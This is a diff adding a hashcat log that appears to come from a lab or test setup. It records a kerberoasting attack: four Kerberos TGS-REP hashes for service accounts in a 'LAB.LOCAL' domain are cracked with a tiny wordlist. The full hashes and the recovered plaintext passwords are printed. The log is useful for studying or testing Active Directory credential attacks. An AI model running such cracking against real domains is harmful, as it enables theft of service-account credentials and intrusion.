@@ -1,0 +1,68 @@
+hashcat (v7.1.2) starting
+
+Initializing bridges. Please be patient...Initialized bridgesInitializing backend runtimes. Please be patient...Initialized backend runtimesInitializing backend devices. Please be patient...Initialized backend devicesOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #01: cpu--0x000, 2937/5874 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Counting lines in kerberoast-multi.hash. Please be patient...Counted lines in kerberoast-multi.hashParsing Hashes: 1/4 (25.00%)...Parsed Hashes: 4/4 (100.00%)Sorting hashes. Please be patient...Sorted hashesRemoving duplicate hashes. Please be patient...Removed duplicate hashesSorting salts. Please be patient...Sorted saltsGenerating bitmap tables...Generated bitmap tablesHashes: 4 digests; 4 unique digests, 4 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Initializing bridge salts. Please be patient...Initialized bridge saltsInitializing device kernels and memory. Please be patient...Initializing backend runtime for device #1. Please be patient...Initialized backend runtime for device #1Host memory allocated for this attack: 513 MB (5317 MB free)
+
+Initialized device kernels and memoryStarting self-test. Please be patient...Finished self-testDictionary cache hit:
+* Filename..: known.txt
+* Passwords.: 3
+* Bytes.....: 36
+* Keyspace..: 3
+
+Starting autotune. Please be patient...Finished autotune                                                          The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Hashcat is expecting at least 4096 base words but only got 0.1% of that.
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+                                                          [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                           Approaching final keyspace - workload adjusted.
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                           $krb5tgs$23$*svc-report$LAB.LOCAL$lab.local/svc-report*$f2346e2c4173ef7394406d0d9a92d711$8eaf7f9faebfa43e9b466c4fe27feed009113eee286662d738c11dd0c4b1ff7e25f22bcba072f3bcc8286c8bf1c1f31fc0fcf57c8f56422a00aba5916d5b05fb262ecc61b251c4276bd0171ed3fccf9a2c72209ec026b34d2b39e8f19b27153832c2ebf02c291cb42e960fabff2da1d0a6bbfa8a4e1af9b0aec44f062cddd83134c7fba49fdb51f3aa4d4958596df4a1bc4b1ca5039edd910e50533b62e9a1eee7f3afd51b6dfa2d704781d498d893c0475b3b156774d42a1e4113cd4c4d24044723e2496b5286a20521642fb5ad6ca735a883c9f7c43a21a87acc9c2966333d79e0ec0a8a81af668a3d5e807b6cb27d6c293d718382f6102b07e589af63d6ab44a33834c8b611cb228870b76859bfe035d8dec297227f094950aec6ca6a7acca2e34b5ed05ae4cf60c72f80f813ba879a131720aeef4303b0e6b7c4035a3d23cdb23dd509ff8486b24673db273688a3c03e0005024253c2cd45854b84638e7e59129a29bd0fbd3f82f038f4f71972c84cc42f9d418e5a0e1fba2ba48cff907e48d2aa400d27d8b7e6d99552b7b2010ff40d8923d71b8d4ba0c43899eb4942f68b942f6a1bcbc2ab1f55625d8f7fac07097f4743f8d983670b57d651709769087542bce8a316d8637631fa94778211656c3edc729d243beaa3040123f17d177b4573742e872bd54374f94ce49703c915f414142bac7cc9408ad4f984cea1a36e0d1dc7e3879693faaf2256a8960cbdf2c4c935133b560caf700e8a2a969179cdb01be5699157db1e2ae7c84b96ed12e4178a08356b52ad03b52b069f05d98f6201841784d8659d6c55c2d6fa328ea019f1331aca78f650a1a8e5cb6679eefbacc34db342c34f7030087312a5098fa048d79d84c9461d7f7e53d0512de9a41c14afb27c5c603bb3b7e213ad41f4f5baa8a196bd79221f94d436a915bb2c7d78b933ad3f2402536283cd45e104bcaf3c6a234bbb5204480c9e059b945d696a8923b47448d1e9722996acf02fa2153df47df56006d35e428a896d3364f5d647538ab8ddbbdff3a98561ec9f62ffcab4508af7ce5c03f0c39e6ad58fee35b2cf7f2276cbf34fb4073fbb1f8c216192fc1965dfe5976913bdf0745edbb0641ab74eba080429e40016af640a382659fe6706e8a7df593a9f54dc051ca112e0bc3bfd933d77e54289e6ce161134a201ea6220f71cd741d155cd81cff06eea4e4cf2917b74a8ae0fbc46afa8ce665beda7ce6cc9d6aead21bcf5ab3a775eaf830f4b203bf29e4fa0e8253dfd631a82befe6ae29998d7c380a6e69f9bacc6bc74287f7bc419b2ea59411b5a566089c16a38836c8ee0184911177d:Autumn2025!
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                           $krb5tgs$23$*svc-sql$LAB.LOCAL$lab.local/svc-sql*$e1141bab9bf1cf8c4b87549252873b28$4246e70fbf810afe63a8f6d029a7f4f37edaf1fd1a49ee6d916510793b61a00be21da957b1ee6b88a68f6f94e549c72d46abda7aef188e05583d194a20ddcfcdf6c1ba3dbeccd39a84c48ff282e6aa48ae8c47acc2d8c4d76ecb30e6dd04a1240cc3eb842b1b6949f7c769b5b93627ec9574fedc47b40f07a2f4bf485f426fec21de5785f52ea83d17e3ee9eed42dfb937aae23cce4e5e89cb065d22d5808b6c6ca53fd173d6a338533f6657b4663bbb181d3b27c6301f032e672b503385b347a5407759b5e691cf7e5d0547289bea89c4ce06670718151ebd9567b65825b3e7f1816304755a9b912a16680d7ffcdffb5255934f36cf2e1a3da61c3c9e6538d8e211a3367e3d43dbf4f35729254a04955bffa49250b264cfa9cb5ca0367b78bc50438c735f700a5edd1341f2c76bfc873146feb01771dda00fe29707f9047eefcb28f8be404b475ddaef71e9951a6ce3885faf0cb893e21cbf60fb9f703b0413f1459310cb0654ce118ee431a090d7cb14f499b4ce6c70b165c813ebed6784738316926d5f698558ea927c1876af83327d6e2d26533185474500387a4f6262476c5128a051059f9400233f245841bee7aed9aa3e46a73977115ccf1e4433d06f6f569d79bfc13a2930395ef1c0a370f0a18fac75ffa82f455a38044a34ffc1cfd3e2cccc9fa77f444dfbda22e0ff4dfc604f7161d9ccecfd82e1571941506cb055f0ceee8930e087df2c2a172099e58273abd107cf2bfee2b50710b246fdd55dbe92fe0a793b1062dd7840edc843f9d9002bf5482b31c7639bacb8c9431e505ba70a6902bf819630c075dda59c71dbd34a4f8fed5d7b980a111d4e09ad6ac05a6520852ebb573b4fd1f94620f1b275a79279cab6bd03c494ef779960135072478cb8cfc637e4e0f05148ade47bef1504bbc838c4b2849c1c76da81bd41585bce2e5154a9320e1bccc1958a26bba957492d1c7776fa305638eebcfeb8ce1980bb8c0e98142d8919328dac7927da37a6d8207dc82a6841156cb7d4aac6cd66f567dfafdc0d90c0777ce0ad6507a1d82f1dd66d52a5a2ad5936151a0a363a8a6f8da5391bbccad30a40d75eab04b8a23abdf9a24bed2a9821d147eb69b265b2d1db7c4312f458c8f415e5e8257fb5485239bc5d0730f0546ad36a5019a91b94b9e32a956eccdbdb4e11fd94e2875799a5e46a4a677511e7b5df7d7b62efce11d6bb896ca065de61aea49710b8276a15d118ff04be1e8c50ceb5be8dfdc2c77aa30a5798c9fa8c6fdda6ec51d5a769578b8e1657225be40813553fc15aba8ec2e21db1505670a41115e2944c0e72420517ab1ca9f1cbcf15:Falcon2019!
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                           $krb5tgs$23$*svc-backup$LAB.LOCAL$lab.local/svc-backup*$73e0e5e1df95ba5fef13d48c18eae01e$300ea96e6822544dcd7e15943c92af16567a552314b436b91f9df412851347b7ee5e891a31ac936bfd9699cf032b84e676a10ba3906a2848fb5826396c7de56e21bfa6d7e8331a0ef1684bcf4c3e9ea59ddacecc66c30b97475b4bab2e24fb541a186b9cd850bb205cb63ad0f513ce31c4170ea6f6c230bebdaf0a7cf9973f34fa8fc134436b238a1297cef59babd522482325ad774420db0096946b530f623c5d757807667e6b0a4c321bb3ee027e3a65d091b8ce8f82c8b120ca04f1a9fa553538a9fc601370fdcda7535ec94923707a18c19741ab6dd463857dc065699dfa396d0f576b2c3014cd4f6ed74c5dd86c18072578333d42b2772b2c92a9ba4baf98314299cca8bfbd6b134060a2fb255db7a6a17c9fd1946a27db8cffb77212de1f36fa0d07a138cda68604393923f72c70f2b1a34e5ace80adfa4a276571b2532fe6c9b6e1bfa0a89710310b26e7b692439512a988b18e219a24df3ef3a6a8b308e40ad9032e62f338e257bdd6650b02dfb8f27934ee0e642b7d93a43b7713e75a5940a82b437e60e930900bbc99d6543d83094263db537667b8602e452c38197a143c5be0fcfa89a8440b670a322f5470f600d4f5853672bebaaac12b6a05ef94ce94d3af88d9774ef5afece48a8356515acd27efa3f24c5cee575aa69b131eceddb8d9e53a3a02f9acba5e6af96d1eaed49578c5821470f6117d3f878cb1cdfc09feeef34223a2cf80991d9c4042518eb89c5aa12bc4f889fbc3ec6990f58cb0611fcda7836f68cc84f20dab7de7355d929ad208ec443a625b714cb86e54ca13e4c30a7e3d93fab27b9e9dc9ed12d3c8f18091b0b9ec477f22137aa2bb3fc2c14ad2044f88fbeb7b15c392de8bf88babbace0147c5c9193d37e962758cb7e2be9c47498e916606af25e7aff348955dbef5a768a9f19180943bcc817c36be1343550dfb8a2558db596e413608b9aa5b2970cea1d011f6a795cf9a30d4006c5578040e37caf14c2efd7e26d3a0fb3dfbc2ac45139e5fbaa5695c34393d265bb1365f7f3fd2f86341a4b9722d445aa1a6c3134c30e3cba3925e84024fcf5f39f282e83a42db18447e87d2e8e2f2b1d7de91868c78d683bed0be34e9a8e4728216559307ec33da46da2fdda2f4bb5c687b2d628da61f94c88333c126b11da12665a4f6b4d046bb440c4b7bb2d046ad26821aa6e1cfe898d9c5d2d09795dc4e3bd79a0d3de0017632ade8af6fc6c82e970c79f02611c8d3bdc8b460ed79865aab0c0f2f801404e654aa9db73173fe2d20307f85873b2d9572d83033014a65236d166b4de9b75442df22880f6c998d1b3c1a6d41be376b34:Autumn2025!
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>                                                           $krb5tgs$23$*svc-web$LAB.LOCAL$lab.local/svc-web*$5374c6eee4ca47542bc38928e577c481$293987607c20d99fc7f14bd1d206f8d946cd6be8f46af23f1318733efec0eb69d2c26a0e50d1ab1136b6fe3d82a4b46f965ceb563cc6508dc4a44ab6be312f9745868a3ac4b1947ab0f91cab7094121cad533542ee8be7dff86ba839a1c6e5c6b1210af33c6856ae687ae33226c3255a2713d4601a3971e837a5f6adfbf58a6e843a48f8f21a3210a24e9fe7f37ef21c18c9a2677ccebad2b53c6b992bbe8cd4cda69690c00dff657221b9b314ac07072cd115ed1c38d58bcd6d939bd5595bc970e636bd635729618b86338adaa2785ddbe9429f5918ccaa76c6e06eb28ab10b641af393bf04268b2cc4af068df361852328f21d5e0559d1afcd252c34b0c6899e893cb38cd469c5be7a25c2851434bba7c19c416fb26d9db60349b1a9c9c40ccca068b49dac7c343f7a56a66e7faf2a3c174d5d078d481b5562428022d313b59293f263d015c1433f462cf3d1d5b4acc79dcc9fcf47794724da67339fedbd0d6e771ff069778a98348cd1a27300acab580ce8e1a8840e2ebd78eb1bd334ccef71bf702d150a95344ee1e3e8a8dafd38414167aacf3b6db1436a2f6feddaba2f0e5166609cbde18ee24262cc1fdaf04699f436d4d85b29711625c1d99bc26dbdd0e2ad036d21989c54cb5b4a729c09c8d730c67fb4d6a2e416317c7b084f4229f5a32f24132fc4b541e725345a2033a49e66c966c0358c06df33bcefcf6bbd2b93e29a2344d8088a268e205509a21428f25e90c0cd74332472bcd6e4c558102e747cde4f0fa079e6753448693a425031d962398296c8083e985fcb96f729e4228b537078507854fb3e123c627de0245826dfcd0351a62070fd794f801542741753c0971179297777237bea121984ab0dee05d8f0d0762b11b1d83b3c6d087c480f7375d72f7410546bae2ee3e4675575ec65efeca38f6c0e4e6afbd0ab09d561581c743223c70f9650c116eedadb696f63e6c3131c9b95ee90eeeb7ba451fb75c00cff7d3f8b1c703f611c63d6d8167adc10344d53f249870df4cefc3e47f2f0eb7e9e0cbc673d6f3e8c41c72f1c3fc690559bcce19aec6909e5328af167a37d523f6923327e889e637d7ff4e74b94094a2a2c2cf280e57dab006e44d47502ae6b9ef43d1e19ba3b5b958664656b87aa1f8dbf11da93e1ed4e7606813bd7c38684875ef05b9d777e934c15f21a3ebac19caba89dd1f1876e4f633ad5774582f38773fae7f7fb5291cc308b9eacdc4336542fc3a9a4783665cb1540f97490ddddea988536f94a77b0e864a868a7575adaa9230aceea43ee4b92fb8785bb8fe3dfeeb3fea95e0ddee4e858f353f4a0e5fdff676e4d93b8:Autumn2025!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: kerberoast-multi.hash
+Time.Started.....: Fri Aug  7 05:23:33 2026 (0 secs)
+Time.Estimated...: Fri Aug  7 05:23:33 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (known.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:    12276 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 4/4 (100.00%) Digests (total), 4/4 (100.00%) Digests (new), 4/4 (100.00%) Salts
+Progress.........: 12/12 (100.00%)
+Rejected.........: 0/12 (0.00%)
+Restore.Point....: 0/3 (0.00%)
+Restore.Sub.#01..: Salt:3 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: Falcon2019! -> Autumn2025!
+
+Started: Fri Aug  7 05:23:33 2026
+Stopped: Fri Aug  7 05:23:35 2026
